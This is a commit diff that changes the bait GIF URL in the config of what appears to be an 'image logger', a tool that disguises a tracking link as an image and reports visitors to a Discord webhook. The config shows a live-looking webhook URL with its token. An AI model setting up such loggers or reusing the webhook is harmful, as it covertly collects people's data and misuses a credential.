779f9b0907d3503db9799a02e40879d5dd55a2c6
EdgerTimmy <136922462+EdgerTimmy@users.noreply.github.com>
2025-06-06 20:32:28 -0400

    Update main.py

--- api/main.py
+++ api/main.py
@@ -13,7 +13,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1364394898844811264/M_BFu4WrwN8L68VvN4RRM9O8tqS2qmEp0avj12MWgMtiwGlVGh52mO4JPeufihVBU5qg",
-    "image": "https://media.tenor.com/Jz-kr6ZjaMMAAAAC/middle-click.gif", # You can also have a custom image by using a URL argument
+    "image": "https://media1.tenor.com/m/Jjm2_71omvcAAAAC/middle-click.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
